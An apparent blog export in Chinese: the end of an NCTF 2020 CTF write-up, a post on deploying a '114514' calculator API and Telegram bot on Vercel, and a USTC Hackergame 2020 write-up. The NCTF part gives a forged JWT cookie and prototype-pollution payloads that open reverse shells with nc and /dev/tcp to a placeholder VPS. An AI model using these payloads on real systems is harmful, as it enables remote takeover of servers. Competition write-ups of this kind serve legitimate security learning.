eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0 把 cookie 里的 auth 修改为如上，成功访问 /debug/cwd，结合 checkcwd.js 提示当前目录为 /app。 const cwd=process.cwd(); if(cwd == '/app'){ console.log('You are in the /app directory.'); } else{ console.log('You are not in the /app directory.'); } 成功利用 POST 请求修改页面内容。 接下来考虑 污染原型链。 rep.replicate(a, b) 函数是将 b 中的每一项内容递归地赋值给 a。 参考 NodeJS child_process 官方文档，以及 从Kibana-RCE对nodejs子进程创建的思考 一文，可以把 Object.env 给污染掉。 node版本&gt;v8.0.0以后支持运行 node 时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。 而 Linux 中的环境变量也会存到文件中，具体在 /proc/self/environ。 再把要执行的命令扔另一个env环境变量里，当 fork 执行新进程时就会调用这个环境变量，从而实现 RCE。 Payload: 这里直接反弹 shell 了。 POST http://42.192.72.11:8092/api/package {\"author\":\"MiaoTony\", \"description\":\"meow\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec('nc VPSIP PORT -e /bin/sh')//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} 或者 {\"author\":\"MiaoTony\", \"description\":\"meow\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1\\\")//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} 在 VPS 上监听端口。 nc -lvvp PORT 而后访问 http://42.192.72.11:8092/debug/cwd 触发 fork。 在根目录下拿到 flag。 NCTF{https://xz.aliyun.com/t/6755_f0rk_p1us_prot0type_p0llution_1quals_RCE...???} （好巧啊，我们看到了同一篇文章 23333 顺便看了一眼 package.json 。 要不是权限问题就能把 package.json 给改了（大雾 定时重启还是挺文明的。 Misc彩蛋关注公众号 回复 flag 就拿到了。 NCTF{We1c0m3_t0_NCTF2020} （吐槽一句，师傅们空间里转的校内横幅居然多了个 !，就离谱。 NCTF2020问卷调查NCTF{Let's_look_forward_to_X1CTF} 这就锤爆 fmyy！ 小结 在耗子锅锅和秦师傅的带领下，拿到了总榜第六。 Team H4rdwo3k1ng 🐀哥哥说他太激动了多打了个 Team （然后还改不了 x 呜呜呜，差点就能拿 Xray 高级版 license 了（（（还是太菜了啊 总而言之，这次 NCTF 2020 还是挺好玩的，题目质量不错。 就是没有真正的 Misc 题，硬肝 Web 题太难顶了。不过学到了不少倒是了嘿嘿。 下次有机会的话再来玩w~ 噢对了，去线下一定锤爆 fmyy！ BTW, 官方 WriteUp 也出来了。 Web 题目环境 GitHub repo: baiyecha404 / My-NCTF2020-Challs （溜了溜了喵~","path":"2020/11/23/CTF_2020NJUPTCTF/"},{"title":"基于Vercel Serverless部署Calc114514 API & Telegram bot","text":"0x00 Preface 前言最近，受到 USTC Hackergame 2020（中国科学技术大学第七届信息安全大赛）超精巧的数字论证器 一题启发，寻思着咱可以整一个网页版本 / Telegram bot 版本的 114514 数字论证器。 See also: USTC Hackergame 2020 WriteUp by MiaoTony 说干就干，考虑到 Vercel 有个 Serverless Function 服务，之前也尝试过在上面搭 API（虽然那时由于执行时间限制等原因没用上），这次的 114514 论证实际上并不复杂，于是就来整一个吧！ （Serverless 真香！ 0x01 TL; DR直接说如何体验，具体如何实现后面再展开。 前后端分离，均部署在 Vercel。 前端：https://calc114514.vercel.app/ Telegram bot: @calc114514bot. 项目开源在 GitHub 上：https://github.com/miaotony/calc114514 欢迎来点个 Star 喵~ API 开放接口 GET / POST https://calc114514.vercel.app/api/calc Param: num a number here. isJson Optional. If 1, return the result(s) with JSON format, else return text/plain result. Return: See examples below. Examples: $ curl \"https://calc114514.vercel.app/api/calc?num=114514\" -~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4) $ curl \"https://calc114514.vercel.app/api/calc?isJson=1&amp;num=114514\" {\"answer\":\"-~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)\",\"number\":\"114514\"} Telegram botSee @calc114514bot. Usage: Send a number to @calc114514bot. 直接给机器人发数字。 Use inline query method, @calc114514bot &lt;Number Here&gt; . 在任意的输入框输入 @calc114514bot 你想论证的数字。 第一个不带原数，第二个带原数，效果分别如下所示。 0x02 Review of the question 题目回顾 数字论证是一种常见的定理证明方法。 简单来说，就是对于给定的自然数，找出一个等值的表达式，如果该表达式去除所有符号部分后为字符串「114514」，则完成论证。表达式仅允许整数运算，可以使用括号、常见的代数运算符 +-*/% 和位运算符 ~^&amp;|。 Via: USTC Hackergame 2020 Calculate a number with 114514 &amp; some operators. 于是我们就需要利用 114514 及一些运算符构造出所给的数字。 See also: 超精巧的数字论证器 (official writeup) 0x03 Demonstration method 论证算法六位数以内论证方法在不超过6位数，即 0 &lt;= num &lt;= 999999 的论证上，参考了 官方 WriteUp 里的算法。 重要性质： -~x == x+1~-x == x-1 对于任意 x 都成立。 一个办法就是按照十进制的方式来凑，即 given_number = (((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f ，其中 a b c d e f 为 0 到 9 之间的整数。表达式中的值 0 10 10 10 10 10 可以分别利用 1 1 4 5 1 4 与嵌套 ~- 来凑出，而 +a +b +c +d +e +f 可以直接利用嵌套 ~- 来实现（不需要使用数字）。 def getans(number): \"\"\" Get the answer using `114514` &amp; `-~`, `~-`. 参考官方 WriteUp，基于十进制分解实现，支持6位及以下数字 \"\"\" jz = 10 s = [] e = \"114514\" for c in e[:1]: s.append(\"~-\" * (int(c)) + c) # value is zero for c in e[1:]: s.append(\"-~\" * (jz - int(c)) + c) # value is jz ans = \"\" for i in range(len(e)): digit = (number // (jz ** (len(e) - 1 - i))) % jz ans = \"(\" + ans + \"*\" + s[i] + \")\" if i &gt; 0 else s[i] ans = \"-~\" * digit + ans return ans 超过六位数的论证方法对于所给整数n，采用与十进制类似的方法，在 $ n^{1/6} $ 附近取六个数，每位取不同进制，最后再凑到所给的数。 （TODO） 0x04 部署 API 接口其实写个接口的话并不难，个人习惯就使用 Python3 及 Flask 进行开发了。 简单地说，就是把路由配好，所需的参数传进来，丢到处理的函数里，把结果再按照需求返回给用户就完事了。 但是又不想为了这玩意儿就整个服务器，也懒得运维，于是想到了以 Serverless 无服务器 的形式进行部署。 常见的 Serverless 服务也挺多，比如 AWS Lambda, Heroku, Cloudflare Workers, Vercel, etc. 这里就用 Vercel 来实现吧。 Vercel 介绍 Vercel is the optimal workflow for frontend teams. All-in-one: Static and Jamstack deployment, Serverless Functions, and Global CDN. Vercel is a cloud platform for static sites and Serverless Functions that fits perfectly with your workflow. It enables developers to host Jamstack websites and web services that deploy instantly, scale automatically, and requires no supervision, all with no configuration. 官网就是 https://vercel.com 它是一个提供了静态资源和 Serverless 函数服务的云平台，可以在同一个网站上进行部署。 对于 Vue.js / Next.js / Hexo / Hugo / … 等等主流前端框架，你只需要把原始代码上传，指定好依赖，它就能帮你构建静态文件，自动完成部署。 它支持 GitHub、GitLab 和 Bitbucket 集成，也支持通过命令行 CLI 工具进行部署。 而且 个人版本是永远免费的！平台限制 也很宽裕。 更多介绍详见 官方介绍文档。 Vercel 就是以前的 ZEIT，其命令行工具就是 vercel，以前是 now。 首先我们安装命令行工具。 npm i -g vercel 看一下版本。 $ vercel --version Vercel CLI 20.1.4 20.1.4 初次使用需要登录，输入邮箱，而后点击邮件里的链接进行授权。 vercel login 若直接部署当前文件夹，直接在命令行输入 vercel 而后按照提示进行操作即可。 其中会询问你项目名称，首次部署时会以此给你分配一个 *.vercel.app 之类的免费域名，这个对应着生产环境。而 *.&lt;username&gt;.vercel.app 则对应着 预览环境/开发环境 (preview)。 之后的每一次部署都会部署到 Preview 环境，确定没问题后再用下面的命令部署到生产环境即可。 vercel --prod 两个环境分离开来就很好用，赞一个。 当然 Vercel 还支持绑定自己的域名，只需要改一改 CNAME 就好，还能自动帮你配上 Let’s encrypt! 的证书。 除此之外，也可以直接在 Settings 下的 Tokens 里新建一个 token，利用其来进行部署。 vercel -t &lt;TOKEN Here&gt; 这一操作很适合在服务器上执行，以及可以白嫖 CI 进行部署。 （嘿嘿，可以在 Organization 里进行构建了 更多 CLI 使用方法可以参考 官方 CLI Reference。 Serverless 部署下面就到了愉快的 Serverless 部署环节了。 参考 Serverless Functions 官方文档，我们需要新建一个 api 文件夹，在里面放我们的代码。 目前支持的后端语言包括： Node.js Go Python Ruby 我这里使用的感觉的话，JS支持最好，毕竟自家有 Next.js。 而 Python 的话其实支持并没有那么好，于是就遇到了一些问题。。 Python files within the api directory, containing an handler variable that inherits from the BaseHTTPRequestHandler class or an app variable that exposes a WSGI or ASGI application, will be served as Serverless Functions. 比如路由问题，它默认是一个文件对应一个路由，即其文件名就是其路由。 但这不合适，我们这里是在一个 py 文件里通过 Flask 来处理路由，暴露一个 app 对象。于是需要自己配置一下。 在 api 外面的目录下新建一个 vercel.json 文件，在里面进行配置。 参考 Configuration Reference，我这里把 /api(.*) 都交给 api/main.py 文件进行处理，这样就能解决路由问题。 { \"version\": 2, \"routes\": [{ \"headers\": { \"Access-Control-Allow-Origin\": \"*\" }, \"src\": \"/api(.*)\", \"dest\": \"api/main.py\", \"continue\": true }] } 同时要注意的是，main.py 里的路由也需要包含 /api，例如 @app.route('/api/calc', methods=['GET', 'POST']) def api_calc(): \"\"\" Calculate 114514 API \"\"\" pass 0x05 部署 Telegram botTelegram bot 才是这次的重点吧。 由于 Telegram 给我们提供了 Webhook 这种处理消息的方式，当 bot 接收到用户发来的消息后，Telegram 服务器会给你设置 Webhook 的 URI 发一个 POST 请求，对这个包进行解析就能得到用户的消息等信息。进而对数据进行处理，再通过 TG bot 的 API 给用户回复消息就完事了。 首先需要设置好 Webhook 到 Vercel 的 URI 上，利用 Flask 的路由去接收。这里略了。 而处理消息的部分，在写的时候最开始是想自己写的，毕竟并不复杂，它送来的是个 JSON 格式的字符串，提取一下就完事了。 但是主要想实现一个内联查询（inline query）的功能，同时还要兼顾消息回复，就觉得有点麻烦，还不如用现成的轮子，懒得造轮子了。 去 GitHub 上搜了一下，发现有两大现成轮子：**python-telegram-bot** 及 **pyTelegramBotAPI**。 他们的文档都挺丰富的，也有很多例子。主要就是对官方的 HTTP API 接口进行了封装，处理消息上好像还做了个队列，用了异步实现的感觉。 （u1s1，那时我一度有 还不如自己写 的感觉 其中前者本身带有一个 webhook 服务器，但试了发现不符合 Vercel 的要求，没有暴露 app 对象之类的，于是跑不起来。 后者则提供了一个 webhook heroku 部署的样例，即 pyTelegramBotAPI/examples/webhook_examples/webhook_flask_heroku_echo.py 关键代码： @server.route('/' + TOKEN, methods=['POST']) def getMessage(): bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode(\"utf-8\"))]) return \"!\", 200 process_new_updates 这个方法能把接收到的信息传进去，从而建立了 Webhook 和 pyTelegramBotAPI 的联系。 于是就用 pyTelegramBotAPI 这个来实现了。 还有一个坑就是，可能是由于异步处理消息的原因，Vercel Serverless 中的 process_new_updates 结束 return 之后这个会话就关闭了，消息还来不及处理完回送给 Telegram。在测试过程中经常就消息莫名其妙丢失了，或者连着发几条消息才回复的情况。 后来尝试了加一个 bot.get_me() 来缓解。 再后来，发现直接加个延时就完事了，time.sleep(0.5)，只需要 0.5s 延时，简单粗暴解决问题。 （喵喵~ 相关代码位于 GitHub repo https://github.com/miaotony/calc114514 的 /api/ 目录下，main.py 内包含了开放接口和 bot 交互的相关接口。 开发说明 Install the requirements. 安装依赖。 pip3 install -r requirements.txt Edit your Telegram bot token and Webhook URL path in the secret.example.py. 这里我把关键配置专门拿出来放到 secret.example.py 文件里了，开发的时候要修改成你的。 Rename secret.example.py to secret.py. 改名。 Run the backend, for example, gunicorn main:app. 运行后端程序。 基于 Vercel 部署： 在配置好 vercel.json 和 api 目录的基础上，直接用 CLI 上传即可。 vercel 0x06 FrontEnd 前端最后，寻思着咱 API 都弄好了，不如再整个前端界面吧。 由于采用了前后端分离架构，直接调用之前写的 API 就好了。 想到 Hackergame 2020 签到题那个界面就不错，于是在此基础上魔改了一下，加了个 AJAX 网络请求，顺便做了个输入框和滑块的双向数据绑定。 前端本身就是静态文件了，直接扔根目录下，基于 Vercel 部署就完事了。 详见： https://calc114514.vercel.app/ BTW, 当你想要论证 114514 的时候会给你多提示个“恶臭的” （嘻嘻 0x07 Summary 小结总之就是写了一大版，从论证算法到接口部署到 Telegram bot 部署再到前端界面，把整个实现的过程说了一通。 前端：https://calc114514.vercel.app/ Telegram bot: @calc114514bot. 代码开源在 GitHub 上：https://github.com/miaotony/calc114514 走过路过点个 STAR 吧~ （Serverless 真香！ 当然最后还是提一句—— 本文相关内容仅供学习研究使用，请在合理合法范围内使用，请勿滥用！ 0xFF Extensive ReadingV2EX: 基于 Vercel 提供的 Serverless 写的服务 vercel 无服务部署 Go 函数 如何免费为你的组织项目配置 Vercel （这个就是用到了上面所说的 Token） （溜了溜了喵~","path":"2020/11/18/Server_Vercel_Calc114514/"},{"title":"CTF | 2020 USTC Hackergame WriteUp","text":"前言一年一度的 USTC Hackergame 又来了。 中国科学技术大学第七届信息安全大赛 比赛平台：https://hack.lug.ustc.edu.cn/ 官方 WriteUp &amp; 题目存档：https://github.com/USTC-Hackergame/hackergame2020-writeups 正好这周事情不是很多，有机会来打一打玩一玩。 由于怕比赛结束再写我会咕咕咕，于是就边做题边写 WriteUp 了。 比赛结束之后又复现了几道被卡住的题这样。 （这篇特别长特别长特别长…… 签到FLAG 提取器 还行。 （就是不想给你1个 flag 吧 233 var prevVal = 0; $(document).ready(function() { $(\"#show\").text($('#number')[0].value); $('#number').on('input', function() { if ($('#number')[0].value.toString() === \"1\") { console.log('没想到吧!'); $('#number')[0].value = 1.00001; if (prevVal == 1.00001) $('#number')[0].value = 0.99999; if (prevVal == 0.99999) $('#number')[0].value = 1.00001; } $(\"#show\").text($('#number')[0].value.toString()); prevVal = $('#number')[0].value; }); }); 直接改 url 就完事了。 猫咪问答++ 以下编程语言、软件或组织对应标志是哺乳动物的有几个？Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.提示：学术上一般认为龙不属于哺乳动物。 …… 不找了（懒 最后直接穷举了，有 12 个。（详见后面） 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？提示：咕咕咕，咕咕咕。 这个题真的有意思。最开始还以为是很常见的 1500 bytes，或者 PPPOE 的1492bytes，但都不对。 于是真就去找了，没想到真有禽类作为标准这一说。 百度百科：信鸽IP通讯 “禽类作为载体传输IP数据包标准” 详见 RFC 1149 - Standard for the transmission of IP datagrams on avia。 得到其 MTU 为 256 毫克。绝了！ BTW, 顺便查到了 常见的 MTU 标准。 详见 RFC 1191: Path MTU Discovery。 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？提示：活动记录会在哪里？ https://lug.ustc.edu.cn/wiki/lug/events/ https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf TEEWORLDS 9 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？提示：建议身临其境。 百度实景地图 好啊！ 9 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？提示：是一个非负整数。 参考 https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/ 经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag，其中约 57.44% 为正确的提交。 17098 抓了个包拿去 Burp Suite 暴力解第一题答案（大雾 最后得到 flag。 2048好一个翻版的2048，然而真正要到 2^14 才行（ 玩了几局发现玩不下去了，直接看源码好了吧。 关键的源码在 html_actuator.js 最后这一段。 HTMLActuator.prototype.message = function (won) { var type = won ? \"game-won\" : \"game-over\"; var message = won ? \"FLXG 大成功！\" : \"FLXG 永不放弃！\"; var url; if (won) { url = \"/getflxg?my_favorite_fruit=\" + ('b'+'a'+ +'a'+'a').toLowerCase(); } else { url = \"/getflxg?my_favorite_fruit=\"; } let request = new XMLHttpRequest(); request.open('GET', url); request.responseType = 'text'; request.onload = function() { document.getElementById(\"game-message-extra\").innerHTML = request.response; }; 其中 NaN 拼接可还行，JS 真奇妙。 于是构造请求 http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana 即可拿到 flag 了！ 一闪而过的 Flag在命令行里打开就完事了。 从零开始的记账工具人 如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？” 你心想：又双叒叕要开始吃土了 这不是很简单吗？电子表格里面一拖动就算出来了 只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字 注意：请将账单总金额保留小数点后两位，放在 flag{} 中提交，例如总金额为 123.45 元时，你需要提交 flag{123.45} 发现是个 excel。 总共有1000行数据，本来想在里面直接转换的，但试了一下发现没找到自带的工具，于是用 Python 写个脚本算算好了。 首先用正则匹配先把元、角、分给提取出来，然后写个字典转换就好了。 这里的转换参考了 Python 中文(大写)数字转阿拉伯数字，在此基础上结合这题改了改代码。 另外考虑到浮点运算可能带来的精度问题，元、角、分单独统计，最后进行合并。 # -*- coding: utf-8 -*- \"\"\" Hackergame 2020 从零开始的记账工具人 @Author: MiaoTony @Time: 20201031 \"\"\" # constants for chinese_to_arabic CN_NUM = { '〇': 0, '一': 1, '二': 2, '三': 3, '四': 4, '五': 5, '六': 6, '七': 7, '八': 8, '九': 9, '零': 0, '壹': 1, '贰': 2, '叁': 3, '肆': 4, '伍': 5, '陆': 6, '柒': 7, '捌': 8, '玖': 9, '貮': 2, '两': 2, } CN_UNIT = { '十': 10, '拾': 10, '百': 100, '佰': 100, '千': 1000, '仟': 1000, '万': 10000, '萬': 10000, '亿': 100000000, '億': 100000000, '兆': 1000000000000, } def chinese_to_arabic(cn: str) -&gt; int: unit = 0 # current ldig = [] # digest for cndig in reversed(cn): if cndig in CN_UNIT: unit = CN_UNIT.get(cndig) if unit == 10000 or unit == 100000000: ldig.append(unit) unit = 1 else: dig = CN_NUM.get(cndig) if unit: dig *= unit unit = 0 ldig.append(dig) if unit == 10: ldig.append(10) val, tmp = 0, 0 for x in reversed(ldig): if x == 10000 or x == 100000000: val += tmp * x tmp = 0 else: tmp += x val += tmp return val if __name__ == '__main__': s = \"\"\"贰拾元陆角伍分 1 壹元壹角贰分 4 拾捌元伍角壹分 1 ... \"\"\" l = s.split('\\n') # print(len(l)) re_split = re.compile(r'(.*元)?(.*角)?(.*分)?') total_yuan = 0 total_jiao = 0 total_fen = 0 for row in l: yuan_int = 0 jiao_int = 0 fen_int = 0 print(row) money = row.split('\\t')[0] count = row.split('\\t')[1] count_int = int(count) money_group = re_split.search(money) if money_group.group(1): yuan = money_group.group(1)[:-1] yuan_int = chinese_to_arabic(yuan) if money_group.group(2): jiao = money_group.group(2)[:-1] jiao_int = chinese_to_arabic(jiao) if money_group.group(3): fen = money_group.group(3)[:-1] fen_int = chinese_to_arabic(fen) print(yuan_int, jiao_int, fen_int) total_yuan += yuan_int * count_int total_jiao += jiao_int * count_int total_fen += fen_int * count_int total = total_yuan + total_jiao * 0.1 + total_fen * 0.01 print(\"total:\", total) 所以就是 flag{20132.81} 后面才知道，这题居然是动态 flag，也就是说动态生成的文件。出题师傅们太强了！ BTW，还发现了一个好用的库 **cn2an**。 📦 快速转化「中文数字」和「阿拉伯数字」～ (最新特性：分数，日期、温度等转化） 自复读的复读机 你现在需要编写两个只有一行 Python 代码的顶尖复读机： 其中一个要输出代码本身的逆序（即所有字符从后向前依次输出） 另一个是输出代码本身的 sha256 哈希值，十六进制小写 满足两个条件分别对应了两个 flag。 参考： Wikipedia: Quine (computing) B乎：如何编写一个打印自身源代码的程序 在Python中有一个 %r，它的意思就是调用对象的 repr() 方法后替换本身在字符串中的位置，对于字符串对象，会保留其本身的引号（这点在我们实现 Quine 的时候会减少很多麻烦）。 输出代码本身的逆序s = \"s = %r;print(''.join(reversed(s %% s)),end='')\";print(''.join(reversed(s % s)),end='') BTW，这个题本来想在 VPS 上搭个接口直接返回的逆向的字符串，不过发现这个机器好像不通外网于是不行？ BTW，这个exec()可以直接读源码但不能读 flag，2333. 原因是用了 subprocess 以 nobody 用户去执行脚本，而 flag 放在了 /root 目录下。 输出代码本身的 sha256 哈希值import hashlib;m=hashlib.sha256();s=\"import hashlib;m=hashlib.sha256();s=%r;m.update((s %% s).encode());print(m.hexdigest(),end='')\";m.update((s % s).encode());print(m.hexdigest(),end='') 233 同学的字符串工具题目所给关键代码如下。 def to_upper(s): r = re.compile('[fF][lL][aA][gG]') if r.match(s): print('how dare you') elif s.upper() == 'FLAG': print('yes, I will give you the flag') print(open('/flag1').read()) else: print('%s' % s.upper()) def to_utf8(s): r = re.compile('[fF][lL][aA][gG]') s = s.encode() # make it bytes if r.match(s.decode()): print('how dare you') elif s.decode('utf-7') == 'flag': print('yes, I will give you the flag') print(open('/flag2').read()) else: print('%s' % s.decode('utf-7')) 字符串大写工具得看看啥字符经过 upper 方法出来就是 flag 或者其中某个字符。 这里就硬是跑出来的。 for i in range(0x80, 0x10000): char = chr(i) if 'f' in char.upper() or 'F' in char.upper(): print(hex(i), chr(i)) print('ﬂ'.upper()) print(len('ﬂ')) payload: ﬂag flag{badunic0debadbad_xxxxxxxx} Unicode 太奇妙了！据说这叫做 unicode 字符折叠/合字（？） Extensive Reading: CSDN: 了不起的 Unicode！ UTF-7 到 UTF-8 转换工具s.encode()和 decode() 默认用的 utf-8 编码，这里用 utf-7 编码再用 utf-7 解码就能吐 flag 了。 最开始用 Python 的 'flag'.encode('utf-7') 方法，发现出来结果就是 b'flag'，傻了。 之后去查了 UTF-7 的维基百科，决定自己按照编码流程走一遍吧。 （没注意是 UTF-16 大端序，我试了半天发现最后是大小端的问题，人傻了。 首先将 flag 转换为 UTF-16(BE) (1201)，即下面的 x。 而后每六位一组进行 base64 编码，这里直接用 base64 模块的方法了。 最后去掉末尾的 =，在最前面加上 +，即可得到 UTF-7 编码。 x = b'\\x00\\x66\\x00\\x6c\\x00\\x61\\x00\\x67' y = base64.b64encode(x) # b'AGYAbABhAGc=' b'+AGYAbABhAGc='.decode('utf-7') # 'flag' payload: +AGYAbABhAGc flag{please_visit_www.utf8everywhere.org_25xxxxxx} https://utf8everywhere.org/ 啊 UTF-8 编码确实是个好东西。 草，想想就气（ 从零开始的火星文生活 L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 GBK 编码，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的火星文…… L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？ 注：正确的 flag 全部由 ASCII 字符组成！ 有大佬发现了一个编解码网站：http://www.mytju.com/classcode/tools/messyCodeRecover.asp 能够猜测原来和可能的编解码方式。 （BTW, 这个网站不是本地跑的，请注意信息安全 根据提示，应该是先用 GBK 来解码，GBK =&gt; UTF-8，然而结果像这样： 发现不对劲，应该反过来，是 UTF-8 =&gt; GBK。 然后再把拿去恢复。 发现是要用 GBK 来读，再转换到 iso-8859-1，即 Latin1（28591）。 要不然就 python 写脚本。（贼想不通这里，佛了 str == encode ==&gt; bytes == decode ==&gt; str with open('gibberish_message.txt', 'rb') as fin: content = fin.read() print(content) content1 = content.decode('utf-8', errors='ignore').encode('gbk') print(content1.decode()) content2 = content1.decode('utf-8', errors='ignore').encode('latin1', errors='ignore') print(content2) content3 = content2.decode('gbk', errors='ignore').encode('utf-8', errors='ignore') print(content3.decode()) 当然也可以在 Linux 下借助 iconv cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8 &gt; 1.txt # OR (utf-8 for default) # cat gibberish_message.txt | iconv -t gbk | iconv -t latin1 | iconv -f gbk 得到文件内容 我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你： ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿xxxxxx｝ 快去比赛平台提交吧！ 不要再把这份信息转发给其他人了，要是被发现就糟糕了！ flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_xxxxxx} 超简单的世界模拟器参考： wikipedia: Conway’s Game of Life 学术干货 | Conway’s Game of Life 生命游戏的建筑设计应用 这里有个模拟器：https://nealwang.net/JustForFun/GameOfLife.html 也挺有意思的。 两个正方形的第一行分别位于第6行，第26行。 蝴蝶效应消除第一个正方形： 下面 LWSS 这个图形能水平向右移动。 而 Glinder 这个图形能向右下角45°方向移动。 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 # Or 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 测试中发现这些能清除下面的正方形（（ 000000000000000 000000000000000 000000000000000 000000000010000 000000000001000 100100000111000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 # OR 000000000000000 000000000000100 000000000000010 000000000001110 000000000000000 100100000000000 000010000000000 100010000000000 011110000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 一石二鸟需要同时消除两个正方形。 试了好久没出来，最后还是瞎改出来的233。 发现下面这个图形能向外扩散，于是试试。 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000010010 000000000000001 000000000010001 000000000001111 000000000000000 000000000000000 001100000000000 000100000000000 011100000000000 000000000000000 233 同学的 Docker 233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。 但是 233 同学突然发现它不小心把一个私密文件（flag.txt）打包进去了，于是写了一行命令删掉这个文件。 「既然已经删掉了，应该不会被人找出来吧？」233 想道。 Docker Hub 地址：8b8d3c8324c7/stringtool 首先把镜像拉下来 docker pull 8b8d3c8324c7/stringtool 在 Image Layers 里可以看到删除 flag.txt 的层。 或者 docker history 8b8d3c8324c7/stringtool 那么我们就找一找构建过程中的文件好了。 把镜像导出来。 docker save 8b8d3c8324c7/stringtool &gt; images.tar BTW, docker save 用来将一个或多个 image 打包保存，而 docker export 用来将 container 的文件系统进行打包。 docker load 用来载入镜像包，docker import 用来载入容器包，但两者都会恢复为镜像； docker load 不能对载入的镜像重命名，而 docker import 可以为镜像指定新名称。 （参考 docker save与docker export的区别） 在里面找到了。（话说有没有快一点的方法唉 flag{Docker_Layers!=PS_Layers_hhh} 顺便看了一眼 Dockerfile。 # Set the base image to use to centos 7 FROM centos:7 # Set the file maintainer MAINTAINER Software_Engineering_Project # Install necessary tools RUN yum -y install wget make yum-utils # Install python dependencies RUN yum-builddep python -y # Install tools needed RUN yum -y install gcc RUN yum -y install vim RUN yum -y install mariadb-devel # Download the python3.7.3 RUN wget -O /tmp/Python-3.7.3.tgz https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz # Build and install python3.7.3 RUN tar -zxvf /tmp/Python-3.7.3.tgz -C /tmp/ RUN /tmp/Python-3.7.3/configure RUN make &amp;&amp; make install # Create symbolic link RUN rm -f /usr/bin/python RUN ln -s /usr/local/bin/python3 /usr/bin/python RUN ln -s /usr/local/bin/pip3 /usr/bin/pip # Upgrade the pip RUN pip install --upgrade pip # Fix the yum RUN sed -i 's/python/python2/' /usr/bin/yum # Clean RUN rm -rf /tmp/Python-3.7.3* RUN yum clean all RUN pip3 install ipython RUN pip3 install bpython RUN pip3 install pipenv ENV PYTHONUNBUFFERED 1 RUN mkdir /code WORKDIR /code COPY . /code/ RUN rm /code/flag.txt ENTRYPOINT python /code/app.py 每一次 RUN 都是新开一个容器执行相应的操作，在当前镜像基础上执行指定命令，并提交为新的镜像。 某种程度上可以说镜像是一个分层的文件系统。Docker 